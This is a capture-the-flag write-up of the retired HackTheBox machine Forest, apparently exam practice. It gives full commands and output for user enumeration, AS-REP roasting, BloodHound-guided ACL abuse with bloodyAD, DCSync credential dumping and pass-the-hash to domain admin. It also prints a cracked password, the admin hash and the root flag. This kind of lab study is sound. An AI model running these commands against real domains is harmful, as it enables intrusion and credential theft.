# FOREST - Easy

**Date Started:** June 9, 2026
**Difficulty:** Easy
**Platform:** HackTheBox (retired)
**Tags:** Active Directory, AS-REP Roasting, BloodHound, ACL abuse, DCSync, Pass-the-Hash
**Status:** ✅ COMPLETE

---

## Summary / Attack Chain

Same **model** as Active, completely different **techniques** — null-session user enum → AS-REP roast → WinRM shell → BloodHound-mapped ACL chain → DCSync → DA.

```
null SMB session → enumerate users → svc-alfresco (pre-auth disabled)
  → AS-REP roast → crack → svc-alfresco:s3rvice
    → evil-winrm shell (Remote Management Users) → user flag
      → BloodHound: Account Operators --GenericAll--> Exchange Windows Permissions --WriteDacl--> domain
        → add svc-alfresco to Exchange Windows Permissions → grant DCSync
          → DCSync → Administrator hash → Pass-the-Hash → root
```

**New techniques vs Active:** AS-REP Roasting (no cred needed), BloodHound ACL pathing, ACL-abuse chain (GenericAll → WriteDacl → DCSync), Pass-the-Hash.

---

## Phase 1 — Enumeration

```bash
nmap -p- --min-rate 1000 -T4 <TARGET> -oN forest_allports.txt
nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001 -sC -sV <TARGET> -oN forest_services.txt
```

**Findings / reads:**
- Same **DC fingerprint** as Active (53/88/389/636/3268/3269/445/464). It's a Domain Controller.
- **Domain: `htb.local`**, FQDN `FOREST.htb.local` (LDAP + `smb-os-discovery`).
- **Server 2016** — not ancient like Active's 2008 R2 → expect AD misconfig, not an OS CVE.
- **Difference from Active: `5985/tcp` (WinRM) is OPEN.** → if I get a credential for an allowed user, `evil-winrm` gives an interactive shell (vs Active's psexec). *Compare boxes port-by-port — the differences are where the different paths hide.*

```bash
echo "<TARGET> htb.local FOREST.htb.local FOREST" | sudo tee -a /etc/hosts
```
*(Get the FQDN/hostname from THIS box's nmap output — don't copy another box's values.)*

---

## Phase 2 — Null-Session Enumeration

```bash
nxc smb <TARGET> -u '' -p '' --shares
```
- Header confirms **`Null Auth: True`** (anonymous login allowed) — but `--shares` returns **`STATUS_ACCESS_DENIED`**. The Active playbook (loot a share) is **closed here.**

**Pivot:** a null session can still query the DC for *other* things. Most valuable on a DC: **the user list.**
```bash
nxc smb <TARGET> -u '' -p '' --users
```
- Returns **31 users.** Filter the noise: built-ins (Administrator/Guest/krbtgt/DefaultAccount), `SM_*` + `HealthMailbox*` (Exchange service accounts — *note: Exchange is installed, matters later*).
- Real accounts left: sebastien, lucinda, **`svc-alfresco`**, andy, mark, santi.
- **`svc-alfresco`** = a **service account** (the standout, like `SVC_TGS` on Active).

Save the real users to `users.txt` for the next step.

---

## Phase 3 — AS-REP Roasting → svc-alfresco

**Concept:** Kerberos pre-auth normally forces you to prove you know a password before the DC responds. Accounts with **"Do not require Kerberos pre-authentication"** set skip that — the DC will hand you an **AS-REP encrypted with the user's password hash** with *no credential required*. Crack it offline.

> vs Kerberoasting (Active): Kerberoast needs a valid domain cred + targets **SPN** accounts (`-m 13100`). AS-REP needs **only a username** + targets **pre-auth-disabled** accounts (`-m 18200`). Forest gives you only usernames → AS-REP is the fit.

```bash
GetNPUsers.py htb.local/ -dc-ip <TARGET> -usersfile users.txt -no-pass
```
- Most users → "doesn't have UF_DONT_REQUIRE_PREAUTH" (protected, normal).
- **`svc-alfresco`** → returns a `$krb5asrep$23$...` blob.

> **Debug note:** if a known user returns `KDC_ERR_C_PRINCIPAL_UNKNOWN` ("Client not found"), **doubt your input, not the box** — likely a typo (e.g. `svc_alfresco` underscore vs `svc-alfresco` hyphen). Kerberos matches the principal name exactly.

### Crack (Mac GPU, mode 18200)
```bash
scp opsbox:~/<file>.hash ~/
hashcat -m 18200 ~/<file>.hash ~/wordlists/rockyou.txt
```
**Result:** `svc-alfresco : s3rvice`

---

## Phase 4 — WinRM Shell + User Flag

5985 was open → svc-alfresco is in **Remote Management Users** → interactive shell:
```bash
nxc smb <TARGET> -u svc-alfresco -p 's3rvice'         # validate (note: no Pwn3d — not admin yet)
evil-winrm -i <TARGET> -u svc-alfresco -p 's3rvice'   # shell
```
```
*Evil-WinRM* PS> type C:\Users\svc-alfresco\Desktop\user.txt
```

---

## Phase 5 — BloodHound: Map the Path to DA

Collect remotely (no SharpHound upload needed — Forest's path is ACL/group-membership, which LDAP collection captures; also dodges Defender flagging SharpHound.exe). Use the **CE** collector to match BloodHound-CE:
```bash
bloodhound-ce-python -d htb.local -u svc-alfresco -p 's3rvice' -ns <TARGET> -c All --zip
# scp zip to Mac -> ingest at localhost:8080 -> mark svc-alfresco Owned -> Pathfinding to Domain Admins
```

**Path returned:**
```
svc-alfresco --MemberOf×3--> ACCOUNT OPERATORS --GenericAll--> EXCHANGE WINDOWS PERMISSIONS --WriteDacl--> HTB.LOCAL
```
Read it as **source → permission → target** (ignore structural `MemberOf`/`Contains`; trace abuse edges). **Two chained levers:**
1. **Account Operators** has **GenericAll** on *Exchange Windows Permissions* → can **add a member**. (svc-alfresco inherits this via the nested groups.)
2. **Exchange Windows Permissions** has **WriteDacl** on the domain → can **grant DCSync**.

> Why it's exploitable: a *non-admin* group (Exchange Windows Permissions, created with Exchange) holds a dangerous domain permission. Domain Admins doesn't *need* WriteDacl — it already owns everything. The **misconfig + nesting** is the vuln.

---

## Phase 6 — ACL Abuse → DCSync → DA

All Linux-native with **bloodyAD** (same family as the exam; no PowerView upload / AV fight):

```bash
# Lever 1: Account Operators' GenericAll → add self to Exchange Windows Permissions
bloodyAD --host <TARGET> -d htb.local -u svc-alfresco -p 's3rvice' \
  add groupMember "Exchange Windows Permissions" svc-alfresco

# Lever 2: now in EWP → use its WriteDacl on the domain to grant self DCSync
bloodyAD --host <TARGET> -d htb.local -u svc-alfresco -p 's3rvice' \
  add dcsync svc-alfresco
```
> Works despite just joining the group because each bloodyAD run authenticates fresh → new Kerberos ticket includes the new membership.

```bash
# DCSync: replicate the Administrator hash out of the DC
secretsdump.py htb.local/svc-alfresco:'s3rvice'@<TARGET> -just-dc-ntlm
```
```
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
```

### Pass-the-Hash → root
NTLM accepts the hash *as* the credential — no cracking needed:
```bash
nxc smb <TARGET> -u Administrator -H 32693b11e6aa90eb43d32c72a07ceea6        # (Pwn3d!)
evil-winrm -i <TARGET> -u Administrator -H 32693b11e6aa90eb43d32c72a07ceea6
```
```
*Evil-WinRM* PS> type C:\Users\Administrator\Desktop\root.txt
# d260fd089f3414a5468bf488d024792e
```

---

## Flags

| Flag | Value |
|------|-------|
| user.txt | *(svc-alfresco Desktop — instance-specific)* |
| root.txt | `d260fd089f3414a5468bf488d024792e` |

---

## Lessons / Exam Relevance

- **Same model, different techniques** — enumerate → find anomaly → cred → "what does it unlock?" → escalate. Identical to Active; only the techniques swapped.
- **Compare boxes port-by-port** — Forest's open 5985 (WinRM) vs Active's not = different shell route (evil-winrm vs psexec).
- **Null session ≠ just shares** — when share enum is denied, pull the **user list** (`--users`). Enumerate users *before* any password attack — never brute-force blind (loud + lockouts).
- **AS-REP Roasting** — only a username needed; `GetNPUsers -no-pass` → `hashcat -m 18200`. The cousin of Kerberoast.
- **BloodHound is for *paths*, not group lists** — mark owned, run Pathfinding, read edges as `source --permission--> target`. Right-click an edge → Abuse Info for exact commands.
- **ACL-abuse chains** — `GenericAll` (add member) + `WriteDacl` (grant DCSync) nested together. bloodyAD: `add groupMember`, `add dcsync`.
- **DCSync** (`secretsdump -just-dc-ntlm`) → **Pass-the-Hash** (`evil-winrm -H` / `nxc -H`) — the hash *is* the credential for NTLM; don't crack it.
- **Misconfig logic** — a vuln is often a *non-privileged* principal holding a *privileged* right. If the powerful group held it, there'd be nothing to abuse.

## Cleanup / Changes Made (engagement habit — revert in a real engagement, log in appendix)

- Added `svc-alfresco` to **Exchange Windows Permissions** → remove: `bloodyAD ... remove groupMember "Exchange Windows Permissions" svc-alfresco`
- Granted `svc-alfresco` **DCSync** on the domain → remove the replication ACE you added.
